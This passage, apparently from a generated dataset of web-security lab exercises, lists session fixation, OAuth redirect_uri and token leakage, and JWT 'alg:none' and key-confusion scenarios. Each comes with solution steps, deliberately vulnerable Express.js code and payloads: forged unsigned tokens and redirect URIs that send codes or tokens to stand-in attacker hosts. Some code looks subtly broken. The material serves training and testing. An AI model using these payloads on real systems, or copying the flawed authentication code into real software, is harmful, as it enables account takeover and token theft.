      "Refresh the page with the fixed session ID to access victim's authenticated dashboard.",
      "Access /user-dashboard to confirm takeover of victim session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); app.use(session({ secret: 'sesskey', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; const schema = buildSchema(`type Query { login(username: String!, password: String!): String }`); const root = { login: ({ username, password }, req) => { const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; return 'Logged in'; } throw new Error('Invalid credentials'); } }; app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true })); app.get('/user-dashboard', (req, res) => { if (req.session.user) return res.send('User dashboard of ' + req.session.user); res.status(403).send('Not logged in'); }); app.listen(5000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Cookie: connect.sid=sess:attacker123",
      "GraphQL login mutation with attacker-fixed cookie",
      "GET /user-dashboard with stolen session cookie"
    ]
  },
  {
    "Lab scenario": "OAuth Access Token Leakage via Referrer Header",
    "Lab Description": "This lab involves a misconfigured OAuth flow leaking access tokens via the Referrer header. The application redirects users to a third-party analytics service after OAuth login, inadvertently exposing access tokens in the URL. To solve: leak an access token, capture it via a controlled endpoint, and use it to access the victim's profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth login via Burp to observe the token returned in the fragment of redirect URI.",
      "Notice redirect includes sensitive token in URL and a 302 to analytics.thirdparty.com.",
      "Host a public endpoint and configure redirect URI to attacker-controlled domain.",
      "Capture token via Referrer header from analytics redirect.",
      "Use intercepted token in Authorization header to access /profile of victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const token = req.query.token; if (token) res.redirect('https://analytics.thirdparty.com/log?ref=' + encodeURIComponent(req.originalUrl)); else res.send('Missing token'); }); app.get('/profile', (req, res) => { const token = req.headers.authorization; if (token === 'Bearer leaked-oauth-token') return res.send('Carlos Profile'); res.status(403).send('Invalid token'); }); app.listen(6000, () => console.log('OAuth Referrer Leak Lab running'));",
    "payloads": [
      "GET /oauth/callback?token=leaked-oauth-token",
      "Redirect URL: https://attacker.site#token=leaked-oauth-token",
      "Authorization: Bearer leaked-oauth-token"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via 'none' algorithm in token validation logic",
    "Lab Description": "The application uses JWTs for session management, but fails to enforce algorithm verification during token validation. The vulnerable backend accepts unsigned tokens when the 'alg' header is set to 'none'. To solve: Access Carlos's account without possessing his valid credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT token after logging into your account using Burp Suite.",
      "Use jwt.io or Postman to decode the JWT and observe the algorithm set as 'HS256'.",
      "Modify the token header to 'alg':'none' and remove the signature section entirely.",
      "Replace the payload to impersonate 'carlos' (e.g., {\"username\":\"carlos\"}) and re-encode the token.",
      "Send a request to /account with the modified token in the Authorization header and access the restricted content."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const SECRET = 'insecure-secret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, SECRET, { algorithms: ['HS256', 'none'] }); if (payload.username === 'carlos') return res.send('Welcome carlos!'); res.send('Unauthorized'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT None Bypass running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{ \"alg\": \"none\" }.{ \"username\": \"carlos\" }."
    ]
  },
  {
    "Lab scenario": "Session fixation via pre-authenticated cookie reuse in login flow",
    "Lab Description": "This app allows session cookies to be set prior to login and fails to regenerate them upon successful authentication. The backend trusts any existing session ID, enabling an attacker to fixate a victim’s session. To solve: Access Carlos’s account by presetting a session and tricking him to log in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept your own login and observe that the session cookie remains unchanged after login.",
      "Generate a session cookie (e.g., session=attacker123) via a GET /login request before authentication.",
      "Craft a phishing link and get Carlos to log in while having the attacker-controlled session ID set in his browser.",
      "Once Carlos logs in, use the fixed session (attacker123) to access /account.",
      "Verify that you’re accessing Carlos's account with the stolen session ID."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(require('body-parser').urlencoded({ extended: true })); const users = { 'carlos': 'hunter2' }; const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.session || Math.random().toString(36).substr(2); res.cookie('session', sid); res.send('<form method=post><input name=username><input name=password></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.session] = username; res.redirect('/account'); } else res.send('Login failed'); }); app.get('/account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Welcome ${user}`); else res.status(403).send('Forbidden'); }); app.listen(4001, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Set-Cookie: session=attacker123",
      "Trick victim to login with attacker123 session active"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration via open redirect in authorization flow",
    "Lab Description": "This application integrates with an OAuth provider but does not properly validate the 'redirect_uri' parameter. This enables an attacker to hijack the authorization code and impersonate users. To solve: Hijack Carlos’s OAuth token by manipulating the redirect URI.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate an OAuth login and observe the redirect_uri parameter passed to the authorization endpoint.",
      "Modify the redirect_uri to an attacker-controlled domain that reflects authorization codes (e.g., http://attacker.com/capture?code=XXX).",
      "Send the manipulated login link to Carlos using a phishing method.",
      "Capture the authorization code when Carlos clicks and completes the login.",
      "Exchange the captured code at /oauth/callback endpoint to log in as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const client_id = 'app123'; const client_secret = 'topsecret'; const REDIRECTS = {}; app.get('/login', (req, res) => { const redirect = req.query.redirect_uri; REDIRECTS[req.query.state] = redirect; const authURL = `http://oauth-provider.com/auth?client_id=${client_id}&redirect_uri=${redirect}&response_type=code&state=xyz`; res.redirect(authURL); }); app.get('/oauth/callback', async (req, res) => { const code = req.query.code; const state = req.query.state; const tokenRes = await axios.post('http://oauth-provider.com/token', { code, client_id, client_secret }); const user = tokenRes.data.user; res.send(`Logged in as ${user}`); }); app.listen(7000, () => console.log('OAuth Misconfig Lab running'));",
    "payloads": [
      "redirect_uri=http://attacker.com/capture",
      "http://oauth-provider.com/auth?client_id=app123&redirect_uri=http://attacker.com/capture&response_type=code"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow using REST API",
    "Lab Description": "The application uses REST API endpoints to manage login sessions but does not regenerate session tokens upon authentication. This introduces a session fixation vulnerability. The application continues to use the pre-login session identifier after successful login, allowing an attacker to predetermine a session for the victim. To solve: Hijack Carlos's session after forcing him to authenticate using a fixed session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept a GET /api/session request before login using Burp Suite to obtain a session ID.",
      "2. Craft a phishing link with this session ID as a cookie and lure the victim to log in.",
      "3. After victim logs in, reuse the fixed session ID to access authenticated endpoints.",
      "4. Verify Carlos’s login by calling GET /api/profile using the fixed session ID.",
      "5. Access GET /api/account/carlos with the hijacked session cookie to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const sessions = {}; const users = { 'carlos': { password: 'securepass', profile: 'Sensitive data for Carlos' } }; app.get('/api/session', (req, res) => { const sid = 'sess_' + Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('session', sid).json({ message: 'Session initialized' }); }); app.post('/api/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (!sid || !sessions[sid]) return res.status(400).send('Invalid session'); if (users[username] && users[username].password === password) { sessions[sid].authenticated = true; sessions[sid].user = username; res.send('Login successful'); } else { res.status(403).send('Invalid credentials'); } }); app.get('/api/account/:user', (req, res) => { const sid = req.cookies.session; const session = sessions[sid]; if (session && session.authenticated && session.user === req.params.user) { res.send('Access granted to account of ' + req.params.user); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "GET /api/session -> Extract session cookie",
      "Phishing URL with cookie: session=sess_attackerControlled",
      "Force victim login under fixed session",
      "Use stolen session: session=sess_attackerControlled to access /api/account/carlos"
    ]
  },
  {
    "Lab scenario": "JWT token algorithm confusion in GraphQL authorization header",
    "Lab Description": "This application implements authentication using JWT tokens passed in the Authorization header. The server fails to enforce proper JWT signing algorithm, making it vulnerable to 'alg=none' attacks. The GraphQL resolver accepts unsigned tokens if the algorithm is altered to 'none'. To solve: Tamper a valid JWT to impersonate Carlos and retrieve his sensitive GraphQL data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture a valid JWT token by logging into your own account via GraphQL using Postman.",
      "2. Decode the token using jwt.io and note the structure.",
      "3. Replace the 'alg' header from 'HS256' to 'none' and set the payload 'username' to 'carlos'.",
      "4. Remove the signature part entirely and resend the JWT in Authorization: Bearer header.",
      "5. Use GraphQL query `{userProfile {username, secretData}}` to verify Carlos's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const users = { carlos: { password: 'jwt123', secretData: 'Carlos JWT Secret' } }; const schema = buildSchema(`type Query { userProfile: User } type User { username: String, secretData: String }`); const root = { userProfile: (args, context) => { const token = context.headers.authorization?.split(' ')[1]; if (!token) throw new Error('No token'); const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') return { username: 'carlos', secretData: users['carlos'].secretData }; const verified = jwt.verify(token, 'secret'); return { username: verified.username, secretData: users[verified.username].secretData }; } }; app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, graphiql: true, context: req }))); app.listen(4001);",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\"}",
      "Unsigned token: base64(header).base64(payload).",
      "Authorization: Bearer [tampered-token]",
      "GraphQL query: { userProfile { username, secretData } }"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in implicit flow token leakage via URL fragment",
    "Lab Description": "The application integrates third-party login via OAuth 2.0 implicit flow. The access token is exposed in the URL fragment after redirection and is not securely handled by the client. An attacker can capture the token via open redirect or history sniffing. To solve: Steal Carlos's access token and access his profile via the third-party login endpoint.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Observe the OAuth login process and note that access_token is returned in URL fragment.",
      "2. Craft an open redirect URI on your domain to capture fragment contents via JavaScript.",
      "3. Send Carlos a phishing link using the redirect_uri pointing to your server.",
      "4. Once token is received in fragment, use it to call GET /oauth/profile with Authorization: Bearer.",
      "5. Validate access to Carlos's profile and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const html = `<script>window.location='http://attacker.com#' + window.location.hash.substring(1);</script>`; res.send(html); }); app.get('/oauth/profile', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; if (token === 'token-carlos') res.send('Carlos OAuth Profile Data'); else res.status(403).send('Invalid token'); }); app.listen(4002);",
    "payloads": [
      "Redirect URI: http://vulnerable.com/oauth/callback",
      "Crafted phishing URL: https://authserver.com/auth?client_id=123&response_type=token&redirect_uri=http://vulnerable.com/oauth/callback",
      "Capture token from fragment via JS: location.hash",
      "Authorization: Bearer token-carlos",
      "GET /oauth/profile"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion leading to token forgery",
    "Lab Description": "This lab features a JWT-based authentication system vulnerable to algorithm confusion. The application accepts tokens signed using either 'HS256' or 'RS256', but fails to validate the token signature correctly when the algorithm is manipulated. To solve: Forge a valid token as admin and access the /admin dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the login request and capture the JWT token.",
      "2. Decode the JWT using jwt.io or Postman to examine its header and payload. Note the use of the RS256 algorithm.",
      "3. Replace 'alg' in the JWT header from 'RS256' to 'HS256'. Use the public key as the HMAC secret.",
      "4. Re-sign the JWT using HS256 and the public key as the secret with jwt_tool or a Python script.",
      "5. Send the modified token using Burp Repeater to the /admin endpoint with the new Authorization header.",
      "6. Verify access to /admin and confirm the token is accepted without signature verification."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const PUBLIC_KEY = fs.readFileSync('./public.pem'); const PRIVATE_KEY = fs.readFileSync('./private.pem'); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, PRIVATE_KEY, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; const decoded = jwt.verify(token, PUBLIC_KEY); if (decoded.user === 'admin') res.send('Welcome admin'); else res.status(403).send('Forbidden'); }); app.listen(3000);",
    "payloads": [
      "JWT with alg: 'HS256' and public key as secret",
      "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
      "Payload: {\"user\":\"admin\"}"
    ]
  },
  {
    "Lab scenario": "Session fixation through vulnerable redirect handler",
    "Lab Description": "This lab contains a login flow where session identifiers are not properly regenerated upon authentication. The redirect endpoint also reflects unvalidated session tokens. To solve: Fix a session before login, then authenticate as a victim and reuse the session to hijack the session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. In Burp, visit /redirect?next=/profile and observe the Set-Cookie header sets a new session ID.",
      "2. Save this session ID as the attacker.",
      "3. Trick the victim into visiting the /redirect?next=/profile link with attacker-fixed session ID (simulated).",
      "4. Victim logs in and is assigned the fixed session ID.",
      "5. Reuse the same session ID in Burp and access /profile to hijack the session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/redirect', (req, res) => { const sid = Math.random().toString(36).slice(2); sessions[sid] = { user: null }; res.cookie('sid', sid); res.redirect(req.query.next); }); app.post('/login', (req, res) => { const sid = req.cookies.sid; const { username, password } = req.body; if (username === 'victim' && password === 'password') { sessions[sid].user = username; res.send('Login success'); } else { res.send('Invalid credentials'); } }); app.get('/profile', (req, res) => { const sid = req.cookies.sid; if (sessions[sid] && sessions[sid].user) res.send(`Welcome ${sessions[sid].user}`); else res.send('Not logged in'); }); app.listen(4000);",
    "payloads": [
      "GET /redirect?next=/profile with fixed sid",
      "Cookie reuse with sid set pre-login",
      "POST /login with victim credentials while maintaining fixed sid"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration allowing token reuse",
    "Lab Description": "This lab demonstrates a misconfigured OAuth implementation where access tokens are not bound to client identifiers, allowing a user to reuse tokens across client applications. To solve: Reuse an OAuth token issued for your own account to impersonate Carlos via a vulnerable client.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to authorize your own user via /auth?client_id=trusted-app and retrieve the OAuth access token.",
      "2. In Burp, access /callback endpoint used by another app (e.g., /callback?token=...), replacing the token parameter with yours.",
      "3. Observe that your token is accepted, and the app grants access to your own account.",
      "4. Use sqlmap to enumerate OAuth logs at /admin/logs and extract valid token belonging to Carlos.",
      "5. Replay Carlos's token on /callback endpoint of trusted app.",
      "6. Access /account and confirm you're now authenticated as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/auth', (req, res) => { const { username, client_id } = req.query; const token = Buffer.from(username + ':' + client_id).toString('base64'); tokens[token] = username; res.redirect(`/callback?token=${token}`); }); app.get('/callback', (req, res) => { const username = tokens[req.query.token]; if (username) res.send(`Authenticated as ${username}`); else res.status(403).send('Invalid token'); }); app.listen(5000);",
    "payloads": [
      "GET /auth?username=attacker&client_id=trusted-app",
      "Replay of Carlos's token on /callback endpoint",
      "Access token: base64(carlos:trusted-app)"
    ]
  },
  {
    "Lab scenario": "Session Fixation in legacy session management",
    "Lab Description": "This lab uses an outdated session management mechanism where the session ID is not regenerated upon login. The application accepts session tokens from unauthenticated users and associates them to authenticated sessions without invalidating them. To solve: hijack Carlos's session after fixing a session for him and access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the initial unauthenticated GET /login request using Burp Suite to observe the Set-Cookie: sessionID response.",
      "Confirm that the session cookie remains unchanged after successful login by performing a login and comparing pre/post cookies.",
      "Craft a phishing email link containing a known sessionID value and trick Carlos into logging in using it.",
      "Once Carlos logs in, reuse the fixed sessionID from your end by including it in a request to /account.",
      "Verify access by observing Carlos’s account details in the response."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'password123' }; app.get('/login', (req, res) => { const sessionID = req.cookies.sessionID || Math.random().toString(36).substring(2); sessions[sessionID] = sessions[sessionID] || {}; res.cookie('sessionID', sessionID); res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"/><input name=\"password\" type=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessionID = req.cookies.sessionID; if (users[username] === password) { sessions[sessionID].user = username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { const session = sessions[req.cookies.sessionID]; if (session && session.user === 'carlos') { res.send('Welcome Carlos. Account info: [Sensitive Data]'); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "GET /login with fixed sessionID in Cookie header",
      "POST /login with valid credentials and fixed sessionID",
      "GET /account with same sessionID to hijack session"
    ]
  },
  {
    "Lab scenario": "JWT tampering in public-key algorithm confusion",
    "Lab Description": "This application uses a JWT-based authentication mechanism with RS256 algorithm. However, it incorrectly treats the RSA public key as an HMAC secret, allowing token forgery. To solve: forge a JWT token impersonating the admin user and access the protected admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the Authorization header after login and extract the JWT token.",
      "Decode the JWT using jwt.io or a local script and analyze the 'alg' and 'kid' headers.",
      "Replace the alg to 'HS256', and set the payload to {\"username\": \"admin\"}.",
      "Sign the token using the public RSA key as an HMAC secret using a tool like jwt_tool or custom Python script.",
      "Send the forged token in the Authorization header to /admin and confirm admin access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const PUBLIC_KEY = fs.readFileSync('./public.pem'); app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, PUBLIC_KEY, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, PUBLIC_KEY); if (decoded.username === 'admin') { res.send('Admin panel accessed'); } else { res.status(403).send('Access denied'); } } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "JWT header: {\"alg\": \"HS256\"}",
      "JWT payload: {\"username\": \"admin\"}",
      "JWT signed using public key as HMAC secret"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect URI handling",
    "Lab Description": "The application integrates with a third-party OAuth provider but fails to properly validate redirect URIs. This allows attackers to leak authorization codes to a malicious domain. To solve: steal Carlos's OAuth authorization code using a manipulated redirect URI and gain access to his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to analyze the OAuth flow and locate the GET /auth/oauth?redirect_uri=... endpoint.",
      "Craft a malicious redirect URI pointing to your own domain (e.g. attacker.com/code-capture) and initiate OAuth login using Carlos's session.",
      "Use social engineering or an injected iframe to trick Carlos into authenticating with the provider.",
      "Capture the leaked authorization code on your server from the redirect.",
      "Exchange the code manually via Postman to obtain Carlos's access token and use it to access /user/profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth/oauth', (req, res) => { const redirectURI = req.query.redirect_uri; const authURL = `https://oauth.provider.com/auth?client_id=123&redirect_uri=${encodeURIComponent(redirectURI)}&response_type=code`; res.redirect(authURL); }); app.get('/auth/callback', async (req, res) => { const { code } = req.query; const tokenRes = await axios.post('https://oauth.provider.com/token', { code, client_id: '123', client_secret: 'secret', redirect_uri: 'http://vulnerable-app.com/auth/callback' }); const accessToken = tokenRes.data.access_token; res.send(`Access token: ${accessToken}`); }); app.listen(5000);",
    "payloads": [
      "redirect_uri=https://attacker.com/code-steal",
      "GET /auth/oauth?redirect_uri=https://attacker.com",
      "POST /token with stolen code to get victim's token"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in REST login endpoint",
    "Lab Description": "The application uses JWT for session management but does not enforce algorithm validation. Instead, it accepts user-defined algorithms from tokens. The application accepts tokens with 'alg' set to 'none', allowing attackers to forge valid tokens without a signature. To solve: forge a valid admin JWT token and access the /admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a login request using Burp Suite and analyze the JWT structure from the Authorization header.",
      "Use jwt.io or Burp Decoder to decode the token and verify that it uses HS256 with a base64-encoded signature.",
      "Replace the 'alg' field with 'none' and remove the signature segment.",
      "Set the 'user' claim in the payload to 'admin' and re-encode the token.",
      "Send a GET request to /admin with the modified JWT in the Authorization header and confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { 'admin': 'supersecret', 'user': 'userpass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ user: username }, 'topsecret', { algorithm: 'HS256' }); return res.json({ token }); } res.status(401).send('Invalid credentials'); }); app.get('/admin', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Unauthorized'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.user === 'admin') return res.send('Welcome admin'); } try { const verified = jwt.verify(token, 'topsecret'); if (verified.user === 'admin') return res.send('Welcome admin'); } catch (e) { return res.status(401).send('Invalid token'); } res.status(403).send('Forbidden'); }); app.listen(3000, () => console.log('JWT Confusion Lab running on http://localhost:3000'));",
    "payloads": [
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "Session fixation via static session identifier in SOAP login",
    "Lab Description": "The application exposes a SOAP-based login mechanism and sets a session ID before user authentication. This session ID is not regenerated after login, allowing an attacker to fix a session ID and force a victim to use it. To solve: fix a session ID and log in as carlos using this fixed session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to inspect SOAP requests and responses. Observe the Set-Cookie header when accessing /soap/login anonymously.",
      "Send a crafted POST login request with a SOAP body authenticating as carlos using Burp Suite and maintain the same session ID from the unauthenticated state.",
      "Capture the session cookie value from the initial unauthenticated request and send it to the victim via a phishing link.",
      "Once the victim logs in, reuse the fixed session ID in your cookie jar.",
      "Access the /my-account endpoint while reusing the fixed session ID and verify access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const xmlparser = require('express-xml-bodyparser'); const app = express(); app.use(cookieParser()); app.use(xmlparser()); const sessions = {}; const users = { 'carlos': 'password123' }; app.post('/soap/login', (req, res) => { let sessionId = req.cookies.session || Math.random().toString(36).substring(7); if (!sessions[sessionId]) sessions[sessionId] = { user: null }; const { Envelope } = req.body; const username = Envelope.Body[0].login[0].username[0]; const password = Envelope.Body[0].login[0].password[0]; if (users[username] === password) { sessions[sessionId].user = username; res.cookie('session', sessionId); return res.send('<response>Login successful</response>'); } res.send('<response>Login failed</response>'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sid && sessions[sid] && sessions[sid].user === 'carlos') return res.send('Account details for carlos'); res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('SOAP Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "<?xml version=\"1.0\"?><Envelope><Body><login><username>carlos</username><password>password123</password></login></Body></Envelope>",
      "Cookie: session=abc123"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via redirect_uri parameter manipulation",
    "Lab Description": "The application uses OAuth 2.0 for SSO login but fails to validate the `redirect_uri` parameter during the authorization flow. An attacker can manipulate this parameter to exfiltrate the victim's access token. To solve: capture Carlos’s access token by abusing the open redirect and access /my-account as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to analyze the OAuth login redirection flow between the app and the authorization server.",
      "Intercept the initial authorization request and modify the redirect_uri to point to your server (e.g., https://attacker.com/callback).",
      "Send the crafted authorization link to the victim. Once clicked, Carlos’s token will be sent to your server.",
      "Extract the access token from the callback logs on your server.",
      "Use Postman to send an authenticated request with the stolen token to /my-account and verify access to Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const oauthTokens = { 'carlos': 'token-carlos-123' }; const accessLogs = []; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; const user = 'carlos'; const token = oauthTokens[user]; const redirect = `${redirect_uri}?access_token=${token}`; accessLogs.push({ redirect }); res.redirect(redirect); }); app.get('/my-account', (req, res) => { const token = req.query.access_token; if (token === oauthTokens['carlos']) return res.send('Welcome carlos'); res.status(403).send('Access denied'); }); app.listen(5000, () => console.log('OAuth Open Redirect Lab running on http://localhost:5000'));",
    "payloads": [
      "https://victim-app.com/oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/callback&response_type=token",
      "GET /my-account?access_token=token-carlos-123"
    ]
  },
  {
    "Lab scenario": "Session fixation in OAuth login flow",
    "Lab Description": "The application implements a third-party OAuth provider for authentication but mishandles session regeneration during login. The vulnerable behavior arises when an attacker fixes a session ID before the OAuth authorization process and the same session is reused after login. To solve: Hijack Carlos’s session by fixing your session ID and making Carlos authenticate over OAuth with it.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate the login process and intercept the OAuth login flow using Burp Suite's Proxy to extract the session cookie value (session=xyz).",
      "Replace your session ID with a custom value using Burp Repeater and complete the OAuth login, confirming the fixed session persists post-login.",
      "Craft a phishing link using the fixed session ID and OAuth redirect URL pointing to the legitimate login provider and send it to Carlos (simulated interaction).",
      "Observe that once Carlos logs in using that link, the server reuses the original session ID without regeneration.",
      "Use the same session cookie (fixed ID) in a new browser session and access /my-account to view Carlos's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'oauth-secret', resave: false, saveUninitialized: true })); app.get('/auth/callback', (req, res) => { const user = { username: 'carlos' }; req.session.user = user; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (!req.session.user) return res.status(401).send('Unauthorized'); res.send(`Welcome back ${req.session.user.username}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Session Fixation Lab on http://localhost:${PORT}`));",
    "payloads": [
      "GET /auth/callback?code=xyz HTTP/1.1",
      "Set-Cookie: session=attacker-session-id",
      "Phishing OAuth link using fixed session: https://vulnerable-app.com/auth/callback?code=abc"
    ]
  },
  {
    "Lab scenario": "JWT key confusion in asymmetric to symmetric downgrade",
    "Lab Description": "This app uses asymmetric JWT verification (RS256) for session authentication, but fails to validate the signature algorithm properly. If an attacker changes the JWT algorithm to HS256, the server incorrectly uses the public key as a symmetric secret. To solve: Modify the JWT algorithm to HS256 and sign it with the public key to impersonate Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture a JWT after authenticating as any user and decode it using jwt.io or a local tool.",
      "Change the JWT header to use algorithm HS256 instead of RS256 and replace the username in the payload with carlos.",
      "Sign the new JWT using the server’s public key (found via /.well-known/jwks.json or embedded endpoint) as HMAC secret.",
      "Send the forged token in Authorization: Bearer <forged_token> via Postman to /my-account endpoint.",
      "Verify that Carlos’s account data is exposed, confirming the signature bypass and lab completion."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, publicKey); res.send(`Account info for ${payload.username}`); } catch (e) { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Key Confusion Lab on http://localhost:${PORT}`));",
    "payloads": [
      "{\"alg\":\"HS256\",\"typ\":\"JWT\"}",
      "{\"username\":\"carlos\"}",
      "HS256 signature using HMAC with public key",
      "Authorization: Bearer <forged_token>"
    ]
  },
  {
    "Lab scenario": "Session timeout bypass via hidden keep-alive endpoint",
